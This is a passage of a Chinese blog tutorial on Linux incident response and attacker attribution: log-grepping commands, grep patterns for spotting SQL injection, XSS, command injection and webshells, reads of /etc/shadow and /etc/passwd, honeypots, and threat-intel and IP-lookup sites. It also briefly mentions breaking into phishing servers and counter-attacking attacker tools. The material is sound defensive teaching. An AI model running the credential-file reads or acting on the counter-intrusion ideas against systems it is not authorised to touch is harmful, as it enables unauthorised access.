+<p>火绒安全论坛: <a target="_blank" rel="noopener" href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p>
+<p>爱毒霸社区: <a target="_blank" rel="noopener" href="http://bbs.duba.net/">http://bbs.duba.net</a></p>
+<p>腾讯电脑管家: <a target="_blank" rel="noopener" href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p>
+<h4 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h4><p>Virustotal: <a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com</a></p>
+<p>Virscan: <a target="_blank" rel="noopener" href="http://www.virscan.org/">http://www.virscan.org</a></p>
+<p>腾讯哈勃分析系统: <a target="_blank" rel="noopener" href="https://habo.qq.com/">https://habo.qq.com</a></p>
+<p>Jotti恶意软件扫描系统: <a target="_blank" rel="noopener" href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></p>
+<h4 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h4><p>D盾_Web查杀: <a target="_blank" rel="noopener" href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p>
+<p>河马 WebShll查杀: <a target="_blank" rel="noopener" href="http://shellpub.com/">http://shellpub.com</a></p>
+<h2 id="Linux、应急排查"><a href="#Linux、应急排查" class="headerlink" title="Linux、应急排查"></a>Linux、应急排查</h2><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志存放的位置</p>
+<pre class="line-numbers language-none"><code class="language-none">1、列出当天访问次数最多的IP命令
+cut -d- -f 1 log1 |uniq -c | sort -rn | head -20
+
+2、查看每一个IP访问了多少个页面
+awk '{++S[$1]}END {for(a in S) print a,S[a]}' log1
+
+3、看某一个页面被访问的次数
+grep "/index.php" log1 |wc -l
+
+4、查看某一个IP访问了哪些页面
+grep 192.168.70.3 log1 | awk '{print $1,$7}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">1、SQL注入检攻击检测
+grep -E -i "select" log1
+
+2.xss跨站脚本攻击检测
+grep -E -i "(S)%26%23x3c%3B(S+)%3E|(S)%26%23x3c%3B(S+)%2F%3E|(S+)&amp;#x3c;(S+)&gt;|(S+)&amp;#x3c;(S+)/" log1
+
+3.命令注入攻击攻击检测
+grep -E -i "ping%20-c%20|ls%20|cat%20|%20pwd|net user" log1
+
+4.网站被植入webshell后门检测
+grep -E -i "eval|%eval|%execute|%3binsert|%20makewebtaski|/1 .asp|/1jsp|/1.php|/1.aspx %if" log1
+
+5.暴力破解账号攻击检测
+grep -E -i "login" /www/logs/access.log| grep -E -i "POST"| grep -E -i "200"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h3><h4 id="常用命令介绍"><a href="#常用命令介绍" class="headerlink" title="常用命令介绍:"></a>常用命令介绍:</h4><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><pre class="line-numbers language-none"><code class="language-none">find 文件路径 [选项] 内容
+
+#文件名
+-name 区分大小写 php 
+-iname 不区分大小写 Php
+-inum 查找符合指定的inode编号的文件或目录
+
+ls -i 1.php
+4849669 1.php
+
+find -inum 4849669
+find -name "*.php"
+find -type f -name "*.php" |xargs grep 'eval' |more
+
+#文件类型
+-type
+f :普通文件 
+d :目录 
+i :软连接
+
+#文件大小
+-size 
+50k :50k的文件
++50k :大于50k  
+-100k :小于100k  
+M :MB  
+G :GB
+
+#修改时间
+-atime 访问时间
+-mtime 数据修改时间
+-ctime 文件修改时间
++5 6天前修改的所有文件 今天20号--&gt;14天前
+-5 5天内 15-20号
+5  精确的5天前的文件 15号
+
+find -mtime 0 -name "*.php" #当天修改的php文件
+find -ctime -0 -name "*.php" #3天内新增的php文件
+
+#权限
+-perm 
+
+find -iname "*php" -perm 777
+
+#所属组，所有者
+-gid 组
+-uid 
+-user 所有者用户名
+-nouser 
+
+#逻辑运算
+-a 与&amp;
+-o 或|
+-not 非^
+
+find -mtime -3 -a -perm 777
+find -name "*.php" -o -name "*.jsp"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><pre class="line-numbers language-none"><code class="language-none">awk [选项] '正则匹配规则 处理规则' 路径
+
+-F 默认空格做分隔符 可以指定：，
+设置变量，数组，定义函数，加减运算，字符串的拼接
+$1 匹配/输出第1列  $0 原样输出
+sort -n 按照大小排序
+sort -n| uniq -c 排序去除统计
+
+awk '{print substr($4,2,11)}' log1 |sort| uniq -c  #第四列，第2个，11个字符串，排序，去重统计
+awk -F: 'length($2)==0 {print $1}' /etc/shadow  #查找空账号
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h5><p>对系统造成损耗，可能会跑崩，不建议用。</p>
+<h5 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h5><pre class="line-numbers language-none"><code class="language-none">grep   | cat ps
+-c 统计行数
+-v 去掉
+
+ps -ef |grep ssh |grep -v grep
+find ./ -name "*.php" |xargs grep "eval"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="系统日志分析"><a href="#系统日志分析" class="headerlink" title="系统日志分析"></a>系统日志分析</h3><table>
+<thead>
+<tr>
+<th>日志文件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/var/log/cron</td>
+<td>记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td>/var/log/cups</td>
+<td>记录打印信息的日志</td>
+</tr>
+<tr>
+<td>/var/log/dmeslog</td>
+<td>记录了系统在开机时内核自检的信息</td>
+</tr>
+<tr>
+<td>/var/log/auth.log</td>
+<td>系统授权信息，用户登录和使用的权限机制等。</td>
+</tr>
+<tr>
+<td>/var/log/message</td>
+<td>记录系统重要信息的日志。</td>
+</tr>
+<tr>
+<td>/var/log/btmp</td>
+<td>记录错误登录日志</td>
+</tr>
+<tr>
+<td>/var/log/lastlog</td>
+<td>记录系统中所有用户最后一次登录时间的日志</td>
+</tr>
+<tr>
+<td>/var/log/wtmp</td>
+<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。</td>
+</tr>
+<tr>
+<td>/var/log/utmp</td>
+<td>记录当前已经登录的用户信息.</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-none"><code class="language-none">系统安全日志:
+cat /var/log/secure Centos
+cat /var/log/auth Ubuntu
+vim /etc/rsyslog.conf 查看日志存放位置
+
+比较重要的几个日志:
+登录失败记录: /var/log/btmp --&gt; lastb
+登录成功记录: /var/log/wtmp --&gt; last
+目前登录用户信息: /var/run/utmp
+
+
+密码验证失败
+grep "Failed password" /var/log/auth.log | wc -l
+
+密码认证成功
+grep "Accepted password for" /var/log/auth.log
+
+
+查看每个ip失败的次数
+grep "Failed password" /var/log/auth.log | awk '{if (NF==16){c[$11]++}else{c[$9]++}}END{for(u in c)print u,c[u]}'| sort -k 2 -nr | head
+
+查看每个用户名失败的次数
+grep "Failed password" /var/log/auth.log| awk '{if (NF==16){c[$9]++}else{c[$7]++}}END{for(u in c)print u,c[u]}'| sort -k 2 -nr | head
+
+查看密码修改时间
+ls -l /etc/passwd
+
+查看特权账号(权限为0的)
+awk -F: '$3==0{print $1}' /etc/passwd
+
+查看空口令账号
+awk -F: '$2==0{print $1}' /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="进程和网络连接状态分析"><a href="#进程和网络连接状态分析" class="headerlink" title="进程和网络连接状态分析"></a>进程和网络连接状态分析</h3><pre class="line-numbers language-none"><code class="language-none">网络连接命令[netstat]
+-pant  #显示所有,程序名称,不显示别名，tcp连接
+
+查看隐藏进程
+ps -ef|awk '{print}'| sort -n |uniq &gt; 1
+ls /proc| sort -n |uniq &gt;2
+
+查看对应pid的对应程序
+ls -alt /proc/905
+
+显示执行中的程序
+top
+
+查看指定端口
+lsof -i:22
+
+查看pid对应打开的文件
+lsof -p 905<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><pre class="line-numbers language-none"><code class="language-none">检查系统计划任务
+cat /var/spool/cron/crontabs
+cat /var/spool/cron/root #隐藏的计划任务路径
+
+crontab -u root -l 
+
+cat /etc/rc.d/rc.local
+ls /etc/rc3.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="如何溯源真实身份"><a href="#如何溯源真实身份" class="headerlink" title="如何溯源真实身份"></a>如何溯源真实身份</h1><h2 id="攻击源的捕获"><a href="#攻击源的捕获" class="headerlink" title="攻击源的捕获"></a>攻击源的捕获</h2><ul>
+<li>安全设备</li>
+<li>日志与流量分析</li>
+<li>钓鱼 邮箱</li>
+<li>蜜罐</li>
+<li>系统排查出的异常文件、账号</li>
+</ul>
+<h3 id="1-获取哪些数据"><a href="#1-获取哪些数据" class="headerlink" title="1.获取哪些数据?"></a>1.获取哪些数据?</h3><p>攻击者ip、域名、后门、攻击组件、webshell</p>
+<h3 id="2、通过什么方式去获取"><a href="#2、通过什么方式去获取" class="headerlink" title="2、通过什么方式去获取?"></a>2、通过什么方式去获取?</h3><p>蜜罐、安全设备、钓鱼邮件、文件日志进程分析</p>
+<h4 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h4><h5 id="蜜罐的概念"><a href="#蜜罐的概念" class="headerlink" title="蜜罐的概念:"></a>蜜罐的概念:</h5><p>模拟各种常见的应用服务，诱导攻击者攻击，从而记录攻击者的入侵行为，获取攻击者的主机信息、浏览器信息、甚至是真实IP及社交信息。</p>
+<p><img src="assets/image-20230507174704311.png" alt="image-20230507174704311"></p>
+<h5 id="蜜罐溯源的常见两种方式"><a href="#蜜罐溯源的常见两种方式" class="headerlink" title="蜜罐溯源的常见两种方式:"></a>蜜罐溯源的常见两种方式:</h5><ol>
+<li>1、网站上插入特定的js文件。</li>
+<li>2、网站上显示需要下载某插件。</li>
+</ol>
+<h5 id="蜜罐的分类"><a href="#蜜罐的分类" class="headerlink" title="蜜罐的分类: ."></a>蜜罐的分类: .</h5><ol>
+<li><p>1、低交互蜜罐</p>
+<p>模拟服务获取信息比较少安全</p>
+</li>
+<li><p>2、中交互蜜罐</p>
+<p>比较真实的模拟系统，修改过的操作系统</p>
+</li>
+<li><p>3、高交互蜜罐</p>
+<p>真实主机，配置难，不安全，维护难</p>
+</li>
+</ol>
+<p><img src="assets/image-20230507181016222.png" alt="image-20230507181016222"></p>
+<h5 id="蜜罐环境部署-Hfish-开源免费的低交互蜜罐"><a href="#蜜罐环境部署-Hfish-开源免费的低交互蜜罐" class="headerlink" title="蜜罐环境部署: Hfish 开源免费的低交互蜜罐"></a>蜜罐环境部署: Hfish 开源免费的低交互蜜罐</h5><p><a target="_blank" rel="noopener" href="https://hfish.net/#/2-3-windows">https://hfish.net/#/2-3-windows</a></p>
+<h5 id="蜜罐举例"><a href="#蜜罐举例" class="headerlink" title="蜜罐举例"></a>蜜罐举例</h5><ul>
+<li>谛听(长亭科技)</li>
+<li>幻盾、幻阵(默安)</li>
+<li>蜃景(360)</li>
+<li>春秋云阵|(永信至诚)</li>
+<li>幻云(锦行科技)</li>
+<li>明鉴迷网(安恒)</li>
+<li>御阵(腾讯)</li>
+<li>潜听(天融信)</li>
+<li>幻影(非凡安全)</li>
+<li>天燕(启明星辰)。</li>
+<li>等等</li>
+</ul>
+<h4 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h4><p>从这些安全设备能获取哪些信息?</p>
+<ol>
+<li>1、全流量平台</li>
+<li>2、waf</li>
+<li>3、EDR</li>
+</ol>
+<h5 id="全流量"><a href="#全流量" class="headerlink" title="全流量"></a>全流量</h5><p>态势感知:</p>
+<p>全面感知网络安全威胁态势、洞悉网络和应用运行的健康状态、通过全流量分析技术实现完整的网络攻击溯源取证</p>
+<h5 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h5><p>web应用防火墙</p>
+<p>专注于网站及Web应用系统的应用层安全防护</p>
+<h5 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h5><p>终端安全防护</p>
+<p>主动发现来自外部或内部的各类安全威胁。同时，基于端点的背景数据、恶意软件行为以及整体的高级威胁的生命周期的角度进行全面的检测和响应</p>
+<h4 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h4><h5 id="1、通过钓鱼邮箱获取到哪些信息"><a href="#1、通过钓鱼邮箱获取到哪些信息" class="headerlink" title="1、通过钓鱼邮箱获取到哪些信息?"></a>1、通过钓鱼邮箱获取到哪些信息?</h5><ul>
+<li>发件人id</li>
+<li>IP地址</li>
+<li>钓鱼服务器</li>
+<li>恶意样本</li>
+</ul>
+<h5 id="2、溯源可以从哪些地方入手"><a href="#2、溯源可以从哪些地方入手" class="headerlink" title="2、溯源可以从哪些地方入手?"></a>2、溯源可以从哪些地方入手?</h5><ul>
+<li>渗透拿下钓鱼服务器权限–收集信息</li>
+<li>注册信息</li>
+<li>邮箱域名注册商</li>
+<li>C2</li>
+<li>排查内部反连</li>
+</ul>
+<h2 id="溯源反制手段"><a href="#溯源反制手段" class="headerlink" title="溯源反制手段"></a>溯源反制手段</h2><ul>
+<li>IP定位技术</li>
+<li>恶意样本</li>
+<li>社交账号</li>
+<li>ID追踪术</li>
+</ul>
+<h3 id="溯源的方法"><a href="#溯源的方法" class="headerlink" title="溯源的方法"></a>溯源的方法</h3><p><img src="assets/image-20230508122140322.png" alt="image-20230508122140322"></p>
+<h4 id="威胁情报平台"><a href="#威胁情报平台" class="headerlink" title="威胁情报平台"></a>威胁情报平台</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/173479.html">https://www.secpulse.com/archives/173479.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com/</a>    VirusTotal</li>
+<li><a target="_blank" rel="noopener" href="https://x.threatbook.cn/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF">https://x.threatbook.cn/微步在线</a> 微步情报社区</li>
+<li><a target="_blank" rel="noopener" href="https://ti.qianxin.com/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5">https://ti.qianxin.com/奇安信威胁情报</a></li>
+<li><a target="_blank" rel="noopener" href="https://ti.360.net/">https://ti.360.net/</a> 360威胁情报中心</li>
+<li><a target="_blank" rel="noopener" href="https://www.venuseye.com.cn/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5">https://www.venuseye.com.cn/启明星辰威胁情报</a></li>
+<li><a target="_blank" rel="noopener" href="https://redqueen.tj-un.com天际友盟redquee安全智能服务平台/">https://redqueen.tj-un.com天际友盟REDQUEE安全智能服务平台</a></li>
+<li><a target="_blank" rel="noopener" href="https://poma.nsfocus.com/">https://poma.nsfocus.com/</a> 绿盟的威胁分析中心</li>
+</ul>
+<h4 id="ip反查"><a href="#ip反查" class="headerlink" title="ip反查"></a>ip反查</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.chaipip.com/">https://www.chaipip.com/</a> 高精度IP地址查询-查IP</li>
+<li><a target="_blank" rel="noopener" href="https://www.opengps.cn/Data/IP/ipplus.aspx%E9%AB%98%E7%B2%BE%E5%BA%A6IP%E5%AE%9A%E4%BD%8D">https://www.opengps.cn/Data/IP/ipplus.aspx高精度IP定位</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a>  ip反查</li>
+<li><a target="_blank" rel="noopener" href="http://ip.yqie.com/">http://ip.yqie.com/</a> ip地址反向查询</li>
+<li><a target="_blank" rel="noopener" href="http://qd.yyimg.com/act/index/id/">http://qd.yyimg.com/act/index/id/</a> 百度ID反查</li>
+<li><a target="_blank" rel="noopener" href="https://www.reg007.com/">https://www.reg007.com/</a> 注册网站反查</li>
+<li><a target="_blank" rel="noopener" href="https://ip.rtbasia.com/">https://ip.rtbasia.com/</a> tbasia (IP查询)</li>
+<li><a target="_blank" rel="noopener" href="https://www.ipplus360.com/">https://www.ipplus360.com/</a> ipplus360 (IP查询)</li>
+<li><a target="_blank" rel="noopener" href="https://tool.lu/ip/">https://tool.lu/ip/</a> IP地址查询在线工具</li>
+</ul>
+<h4 id="在线云沙箱"><a href="#在线云沙箱" class="headerlink" title="在线云沙箱"></a>在线云沙箱</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://ata.360.cn/detection">https://ata.360.cn/detection</a> 360沙箱云</li>
+<li><a target="_blank" rel="noopener" href="https://s.threatbook.cn微步云沙箱/">https://s.threatbook.cn微步云沙箱</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a> VirusTotal平台</li>
+<li><a target="_blank" rel="noopener" href="https://www.maldun.com/submit/submit_file/">https://www.maldun.com/submit/submit_file/</a> 魔盾安全分析平台</li>
+<li><a target="_blank" rel="noopener" href="https://app.any.run/">https://app.any.run/</a>  Any.Run交互式恶意软件分析平台</li>
+<li><a target="_blank" rel="noopener" href="https://habo.qq.com/">https://habo.qq.com/</a> 腾讯哈勃系统</li>
+<li><a target="_blank" rel="noopener" href="https://mac-cloud.riskivy.com/">https://mac-cloud.riskivy.com</a>  FreeBuf x 漏洞盒子「大圣云沙箱</li>
+</ul>
+<h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>2022实战|记一次Everything服务引发的蓝队溯源</p>
+<p>HW防守|溯源案例之百度ID层层拨茧</p>
+<p>记一次反制追踪溯本求源</p>
+<p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/468288041_120747399">https://www.sohu.com/a/468288041_120747399</a> 境外黑客钓鱼邮件</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/349611368%E7%9C%9F%E5%AE%9E%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%BA%AF%E6%BA%90">https://zhuanlan.zhihu.com/p/349611368真实钓鱼邮件溯源</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/254538.html%E5%82%80%E5%84%A1%E6%9C%BA">https://www.freebuf.com/articles/web/254538.html傀儡机</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md%E5%B7%A5%E5%85%B7">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md工具</a></p>
+<h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><ul>
+<li>攻击路径</li>
+<li>身份画像</li>
+</ul>
+<h2 id="攻击工具反制"><a href="#攻击工具反制" class="headerlink" title="攻击工具反制"></a>攻击工具反制</h2><ul>
+<li>蚊剑</li>
+<li>sqlmap</li>
+<li>cobalt strike</li>
+</ul>
+<h1 id="后溯源"><a href="#后溯源" class="headerlink" title="后溯源"></a>后溯源</h1>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="../../../../../../../about" rel="external nofollow noreferrer">fantasycat6</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://fantasycat6.github.io">https://fantasycat6.github.io</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="../../../../../../../libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="../../../../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="../../../../../../../medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="../../34kali-gao-ji-shen-tou/01-kali-an-zhuang-pei-zhi/01-kali-an-zhuang-pei-zhi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../../32cve-lou-dong-fu-xian/3-cve-2022-22965-springrce/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: fantasycat6<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
